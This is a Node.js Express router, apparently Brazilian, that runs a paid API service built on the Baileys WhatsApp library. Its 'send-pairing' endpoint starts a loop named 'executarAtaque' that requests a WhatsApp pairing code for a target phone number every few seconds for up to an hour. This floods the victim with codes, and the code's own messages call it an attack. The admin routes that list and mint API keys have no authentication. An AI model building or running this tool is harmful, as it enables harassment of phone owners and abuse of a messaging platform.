const express = require('express');
const router = express.Router();
const { default: makeWASocket, useMultiFileAuthState, delay } = require("@whiskeysockets/baileys");
const pino = require('pino');
const fs = require('fs');
const path = require('path');


const DB_PATH = path.join(__dirname, 'database.json');
const PAIRINGS_DIR = path.join(__dirname, 'Pairings');


if (!fs.existsSync(DB_PATH)) fs.writeFileSync(DB_PATH, JSON.stringify({}));
if (!fs.existsSync(PAIRINGS_DIR)) fs.mkdirSync(PAIRINGS_DIR);

const processosAtivos = new Map();


const getDB = () => JSON.parse(fs.readFileSync(DB_PATH, 'utf-8'));
const saveDB = (data) => fs.writeFileSync(DB_PATH, JSON.stringify(data, null, 2));


const validarAcesso = (req, res, next) => {
    const apikey = req.query.apikey || req.body.apikey;
    const db = getDB();
    
    if (!apikey || !db[apikey]) {
        return res.status(401).json({ creator: "mdk0111", status: false, msg: "ApiKey inválida ou ausente." });
    }
    
    const user = db[apikey];
    if (user.requests !== null && user.requests <= 0) {
        return res.status(403).json({ creator: "mdk0111", status: false, msg: "Seus requests acabaram!" });
    }
    
    
    if (user.requests !== null) { 
        user.requests -= 1; 
        saveDB(db); 
    }
    next();
};



router.get('/admin/keys', (req, res) => res.json(getDB()));

router.post('/admin/gerar-key', (req, res) => {
    const { novaKey, limite } = req.body;
    if (!novaKey) return res.status(400).json({ status: false, msg: "Chave vazia." });
    
    const db = getDB();
    db[novaKey] = {
        requests: (limite === "infinito" || !limite) ? null : parseInt(limite),
        data: new Date().toLocaleString()
    };
    saveDB(db);
    res.json({ status: true });
});

router.delete('/admin/deletar-key/:key', (req, res) => {
    const db = getDB();
    delete db[req.params.key];
    saveDB(db);
    res.json({ status: true });
});


router.get('/send-pairing=:numero', validarAcesso, async (req, res) => {
    let targetNum = req.params.numero.replace(/\D/g, ''); 

    if (!targetNum || targetNum.length < 8) {
        return res.status(400).json({ creator: "mdk0111", error: "Número inválido." });
    }

    if (processosAtivos.has(targetNum)) {
        return res.json({ creator: "mdk0111", status: "Aviso", msg: "Este número já está em processo." });
    }

    
    processosAtivos.set(targetNum, true);
    console.log(`🚀 [API] Iniciado para: ${targetNum} (Expira em 1h)`);

   
    setTimeout(() => {
        if (processosAtivos.has(targetNum)) {
            processosAtivos.set(targetNum, false);
            console.log(`⏰ [AUTO-STOP] Tempo limite atingido para: ${targetNum}`);
        }
    }, 3600000);

    const executarAtaque = async (target) => {
        const sessionPath = path.join(PAIRINGS_DIR, `sess_${target}_${Date.now()}`);
        try {
            while (processosAtivos.get(target) === true) {
                const { state } = await useMultiFileAuthState(sessionPath);
                const sock = makeWASocket({ 
                    auth: state, 
                    logger: pino({ level: 'silent' }),
                    printQRInTerminal: false
                });

                try {
                    await delay(3000);
                    const code = await sock.requestPairingCode(target);
                    console.log(`🔑 [CÓDIGO ${target}]: ${code}`);
                } catch (e) {
                    console.log(`❌ Erro no envio para ${target}`);
                }

                await delay(5000); 
                
               
                if (fs.existsSync(sessionPath)) {
                    fs.rmSync(sessionPath, { recursive: true, force: true });
                }
            }
        } catch (err) {
            console.log(`🚨 Erro crítico no processo ${target}:`, err.message);
        } finally {
            processosAtivos.delete(target);
            if (fs.existsSync(sessionPath)) fs.rmSync(sessionPath, { recursive: true, force: true });
            console.log(`🏁 [FINALIZADO] Processo encerrado para: ${target}`);
        }
    };

    executarAtaque(targetNum);
    res.json({ 
        creator: "MDK0111", 
        status: "Processo Iniciado", 
        numero: targetNum,
        expira_em: "1 hora"
    });
});


router.get('/stop-pairing=:numero', validarAcesso, (req, res) => {
    let targetNum = req.params.numero.replace(/\D/g, '');

    if (processosAtivos.has(targetNum)) {
        processosAtivos.set(targetNum, false); 
        res.json({ 
            creator: "MDK0111", 
            status: "Sucesso", 
            msg: `Ataque parado para o número ${targetNum}` 
        });
    } else {
        res.status(404).json({ 
            creator: "MDK0111", 
            status: false, 
            msg: "Este número não está em execução no momento." 
        });
    }
});

router.get('/stop-all', validarAcesso, (req, res) => {
    for (let key of processosAtivos.keys()) {
        processosAtivos.set(key, false);
    }
    res.json({ creator: "MDK0111", status: "Todos os processos ativos foram encerrados." });
});

module.exports = router;
